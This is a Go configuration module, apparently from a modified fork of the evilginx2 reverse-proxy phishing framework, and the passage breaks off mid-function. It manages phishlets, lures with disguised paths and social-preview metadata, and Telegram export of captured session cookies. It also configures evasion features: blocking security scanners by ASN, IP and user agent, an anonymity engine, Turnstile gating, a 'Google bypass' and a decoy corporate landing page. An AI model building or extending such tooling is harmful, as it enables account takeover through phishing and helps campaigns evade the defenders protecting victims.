package core

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
	GeneratedUrl    string `mapstructure:"generated_url" json:"generated_url" yaml:"generated_url"`
	CustomPath      string `mapstructure:"custom_path" json:"custom_path" yaml:"custom_path"` // URL path rewriting - custom path that looks legitimate
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
	DBPath      string `mapstructure:"db_path" json:"db_path" yaml:"db_path"`
}

type EvilFeedConfig struct {
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Endpoint string `mapstructure:"endpoint" json:"endpoint" yaml:"endpoint"`
}

type TurnstileConfig struct {
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	SiteKey   string `mapstructure:"sitekey" json:"sitekey" yaml:"sitekey"`
	SecretKey string `mapstructure:"secretkey" json:"secretkey" yaml:"secretkey"`
}

// RequestCheckerConfig holds configuration for the request blocking system (ASN/IP/UA blocking)
type RequestCheckerConfig struct {
	Enabled       bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	ASNFile       string `mapstructure:"asn_file" json:"asn_file" yaml:"asn_file"`
	UserAgentFile string `mapstructure:"useragent_file" json:"useragent_file" yaml:"useragent_file"`
	IPRangeFile   string `mapstructure:"ip_range_file" json:"ip_range_file" yaml:"ip_range_file"`
	IPListFile    string `mapstructure:"ip_list_file" json:"ip_list_file" yaml:"ip_list_file"`
	Verbose       bool   `mapstructure:"verbose" json:"verbose" yaml:"verbose"`
}

// CloudflareConfig holds configuration for Cloudflare DNS API (used for wildcard certificates)
type CloudflareConfig struct {
	APIToken        string `mapstructure:"api_token" json:"api_token" yaml:"api_token"`
	WildcardEnabled bool   `mapstructure:"wildcard_enabled" json:"wildcard_enabled" yaml:"wildcard_enabled"`
}

// AnonymityConfigPersist holds persistent configuration for the AnonymityEngine
type AnonymityConfigPersist struct {
	Enabled             bool `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	HeaderRandomization bool `mapstructure:"header_randomization" json:"header_randomization" yaml:"header_randomization"`
	UserAgentRotation   bool `mapstructure:"useragent_rotation" json:"useragent_rotation" yaml:"useragent_rotation"`
	ProxyPoolEnabled    bool `mapstructure:"proxy_pool_enabled" json:"proxy_pool_enabled" yaml:"proxy_pool_enabled"`
}

// AdminPanelConfig holds configuration for the admin panel routing (EvilFeed/GoPhish on base domain)
type AdminPanelConfig struct {
	AdminEnabled    bool   `mapstructure:"admin_enabled" json:"admin_enabled" yaml:"admin_enabled"`
	AdminPath       string `mapstructure:"admin_path" json:"admin_path" yaml:"admin_path"`
	AdminBackend    string `mapstructure:"admin_backend" json:"admin_backend" yaml:"admin_backend"`
	MailEnabled     bool   `mapstructure:"mail_enabled" json:"mail_enabled" yaml:"mail_enabled"`
	MailPath        string `mapstructure:"mail_path" json:"mail_path" yaml:"mail_path"`
	MailBackend     string `mapstructure:"mail_backend" json:"mail_backend" yaml:"mail_backend"`
	LandingEnabled  bool   `mapstructure:"landing_enabled" json:"landing_enabled" yaml:"landing_enabled"`
	LandingTitle    string `mapstructure:"landing_title" json:"landing_title" yaml:"landing_title"`
	LandingCompany  string `mapstructure:"landing_company" json:"landing_company" yaml:"landing_company"`
	LandingTagline  string `mapstructure:"landing_tagline" json:"landing_tagline" yaml:"landing_tagline"`
	LandingCategory string `mapstructure:"landing_category" json:"landing_category" yaml:"landing_category"` // tech, finance, healthcare, education, etc.
}

type TelegramConfig struct {
	BotToken        string                      `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
	ChatId          string                      `mapstructure:"chat_id" json:"chat_id" yaml:"chat_id"`
	Enabled         bool                        `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	CookieExportDir string                      `mapstructure:"cookie_export_dir" json:"cookie_export_dir" yaml:"cookie_export_dir"`
	Channels        map[string]*TelegramChannel `mapstructure:"channels" json:"channels,omitempty" yaml:"channels,omitempty"`
}

// TelegramChannel represents a single telegram bot/channel configuration (defined here for config)
type TelegramChannel struct {
	Name        string   `json:"name" yaml:"name"`
	BotToken    string   `json:"bot_token" yaml:"bot_token"`
	ChatId      string   `json:"chat_id" yaml:"chat_id"`
	Enabled     bool     `json:"enabled" yaml:"enabled"`
	Phishlets   []string `json:"phishlets" yaml:"phishlets"`
	Description string   `json:"description" yaml:"description"`
}

type GeneralConfig struct {
	Domain              string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4             string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4        string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4            string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl           string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort           int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort             int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert            bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
	InternalAPIPort     int    `mapstructure:"internal_api_port" json:"internal_api_port" yaml:"internal_api_port"`
	GoogleBypassEnabled bool   `mapstructure:"google_bypass_enabled" json:"google_bypass_enabled" yaml:"google_bypass_enabled"`
}

type Config struct {
	general              *GeneralConfig
	certificates         *CertificatesConfig
	blacklistConfig      *BlacklistConfig
	gophishConfig        *GoPhishConfig
	evilfeedConfig       *EvilFeedConfig
	turnstileConfig      *TurnstileConfig
	requestCheckerConfig *RequestCheckerConfig
	cloudflareConfig     *CloudflareConfig
	anonymityConfig      *AnonymityConfigPersist
	adminPanelConfig     *AdminPanelConfig
	telegramConfig       *TelegramConfig
	proxyConfig          *ProxyConfig
	phishletConfig       map[string]*PhishletConfig
	phishlets            map[string]*Phishlet
	phishletNames        []string
	activeHostnames      []string
	redirectorsDir       string
	lures                []*Lure
	lureIds              []string
	subphishlets         []*SubPhishlet
	cfg                  *viper.Viper
}

const (
	CFG_GENERAL         = "general"
	CFG_CERTIFICATES    = "certificates"
	CFG_LURES           = "lures"
	CFG_PROXY           = "proxy"
	CFG_PHISHLETS       = "phishlets"
	CFG_BLACKLIST       = "blacklist"
	CFG_SUBPHISHLETS    = "subphishlets"
	CFG_GOPHISH         = "gophish"
	CFG_EVILFEED        = "evilfeed"
	CFG_TURNSTILE       = "turnstile"
	CFG_REQUEST_CHECKER = "request_checker"
	CFG_TELEGRAM        = "telegram"
	CFG_CLOUDFLARE      = "cloudflare"
	CFG_ANONYMITY       = "anonymity"
	CFG_ADMIN_PANEL     = "admin_panel"
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:         &GeneralConfig{},
		certificates:    &CertificatesConfig{},
		gophishConfig:   &GoPhishConfig{},
		evilfeedConfig:  &EvilFeedConfig{Endpoint: "http://127.0.0.1:1337/api/internal/ingest"},
		turnstileConfig: &TurnstileConfig{},
		requestCheckerConfig: &RequestCheckerConfig{
			Enabled:       false,
			ASNFile:       "blocklists/asn_list.txt",
			UserAgentFile: "blocklists/useragent_list.txt",
			IPRangeFile:   "blocklists/ip_range_list.txt",
			IPListFile:    "blocklists/ip_list.txt",
			Verbose:       true,
		},
		telegramConfig:  &TelegramConfig{},
		phishletConfig:  make(map[string]*PhishletConfig),
		phishlets:       make(map[string]*Phishlet),
		phishletNames:   []string{},
		lures:           []*Lure{},
		blacklistConfig: &BlacklistConfig{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.json")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	c.cfg.UnmarshalKey(CFG_EVILFEED, &c.evilfeedConfig)
	if c.evilfeedConfig == nil {
		c.evilfeedConfig = &EvilFeedConfig{Endpoint: "http://127.0.0.1:1337/api/internal/ingest"}
	}

	c.cfg.UnmarshalKey(CFG_TURNSTILE, &c.turnstileConfig)
	if c.turnstileConfig == nil {
		c.turnstileConfig = &TurnstileConfig{}
	}

	// Load RequestChecker configuration
	c.cfg.UnmarshalKey(CFG_REQUEST_CHECKER, &c.requestCheckerConfig)
	if c.requestCheckerConfig == nil {
		c.requestCheckerConfig = &RequestCheckerConfig{
			Enabled:       false,
			ASNFile:       "blocklists/asn_list.txt",
			UserAgentFile: "blocklists/useragent_list.txt",
			IPRangeFile:   "blocklists/ip_range_list.txt",
			IPListFile:    "blocklists/ip_list.txt",
			Verbose:       true,
		}
	}

	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)

	// Load Cloudflare configuration for wildcard certificates
	c.cfg.UnmarshalKey(CFG_CLOUDFLARE, &c.cloudflareConfig)
	if c.cloudflareConfig == nil {
		c.cloudflareConfig = &CloudflareConfig{}
	}

	// Load Anonymity configuration
	c.cfg.UnmarshalKey(CFG_ANONYMITY, &c.anonymityConfig)
	if c.anonymityConfig == nil {
		c.anonymityConfig = &AnonymityConfigPersist{
			Enabled:             false,
			HeaderRandomization: false,
			UserAgentRotation:   false,
		}
	}

	// Load Admin Panel configuration (EvilFeed/GoPhish on base domain)
	c.cfg.UnmarshalKey(CFG_ADMIN_PANEL, &c.adminPanelConfig)
	if c.adminPanelConfig == nil {
		c.adminPanelConfig = &AdminPanelConfig{
			AdminEnabled:    true,
			AdminPath:       "/admin/",
			AdminBackend:    "http://127.0.0.1:1337",
			MailEnabled:     true,
			MailPath:        "/mail/",
			MailBackend:     "http://127.0.0.1:3333",
			LandingEnabled:  true,
			LandingTitle:    "Welcome",
			LandingCompany:  "Secure Solutions Inc.",
			LandingTagline:  "Enterprise Security & Cloud Services",
			LandingCategory: "tech",
		}
	}

	// Set default cookie export directory if not set
	if c.telegramConfig.CookieExportDir == "" {
		c.telegramConfig.CookieExportDir = filepath.Join(cfg_dir, "cookies")
		c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	}

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	if c.general.Domain == "" {
		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramBotToken(token string) {
	c.telegramConfig.BotToken = token
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram bot token set")
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramChatId(chatId string) {
	c.telegramConfig.ChatId = chatId
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram chat id set to: %s", chatId)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramEnabled(enabled bool) {
	c.telegramConfig.Enabled = enabled
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram notifications set to: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramCookieExportDir(dir string) {
	c.telegramConfig.CookieExportDir = dir
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram cookie export directory set to: %s", dir)
	c.cfg.WriteConfig()
}

func (c *Config) GetTelegramConfig() *TelegramConfig {
	return c.telegramConfig
}

func (c *Config) GetGoogleBypassEnabled() bool {
	if c.general == nil {
		return false
	}
	return c.general.GoogleBypassEnabled
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) SetGoogleBypassEnabled(enabled bool) {
	if c.general == nil {
		c.general = &GeneralConfig{}
	}
	c.general.GoogleBypassEnabled = enabled
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	// Include base domain if admin/mail panels are enabled (need cert for base domain)
	if site == "" && c.IsBaseDomainActive() && c.general.Domain != "" {
		baseDomain := strings.ToLower(c.general.Domain)
		// Check if base domain is not already in the list
		found := false
		for _, h := range ret {
			if h == baseDomain {
				found = true
				break
			}
		}
		if !found {
			ret = append(ret, baseDomain)
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}

	// ALWAYS allow base domain when admin panel or landing page is enabled
	// This ensures the base domain is accessible for /admin/, /mail/, and landing page
	if host == strings.ToLower(c.general.Domain) && c.IsBaseDomainActive() {
		return true
	}

	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			if l.Path == path {
				return l, nil
			}
			// pl, err := c.GetPhishlet(site)
			// if err == nil {
